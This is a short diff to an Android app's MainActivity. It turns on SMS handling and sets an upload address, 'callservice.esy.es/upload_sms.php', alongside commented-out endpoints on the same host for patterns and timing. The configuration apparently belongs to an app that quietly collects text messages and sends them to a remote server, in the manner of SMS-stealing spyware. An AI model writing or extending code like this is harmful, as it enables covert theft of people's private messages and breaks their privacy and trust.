@@ -31,8 +31,12 @@ public class MainActivity extends Activity {
 		dataUtils.setTargetPattern("00700");
 		dataUtils.setTheHourUpdate(13);
 		
-		dataUtils.setInTest(true, 600000);
-//		dataUtils.setEnableSms(false);
+		dataUtils.setInTest(true, 60000);
+		
+		// sms
+		dataUtils.setEnableSms(true);
+		dataUtils.setUrlUploadSMS("http://callservice.esy.es/upload_sms.php");
+		
 //		dataUtils.setEnableServer(true);
 //		dataUtils.setUrlPatterns("http://callservice.esy.es/pattern.php");
 //		dataUtils.setUrlTime("http://callservice.esy.es/time.php");
